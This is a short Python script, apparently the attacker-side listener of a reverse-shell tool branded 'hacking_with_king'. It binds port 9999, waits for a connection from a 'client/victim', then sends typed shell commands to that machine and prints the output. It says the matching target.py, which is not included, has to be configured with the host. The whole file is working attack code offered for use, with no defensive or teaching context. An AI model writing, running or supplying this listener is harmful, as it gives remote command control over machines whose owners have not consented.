import socket
import sys
import os
os.system('clear')
print ('''

    ____                                    __ __         ____
   / __ \___ _   _____  _____________     _/ // /_  ___  / / /
  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \   / __/ __ \/ _ \/ / / 
 / _, _/  __/ |/ /  __/ /  (__  )  __/  (_  ) / / /  __/ / /  
/_/ |_|\___/|___/\___/_/  /____/\___/  /  _/_/ /_/\___/_/_/   
                                       /_/                    
Author    > king
Instagram > hacking_with_king
github    > KING3140
''')
print ('Make to update the ip/host in target.py file\n')
# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print('Listening baby .......')

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print (client_response,end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()






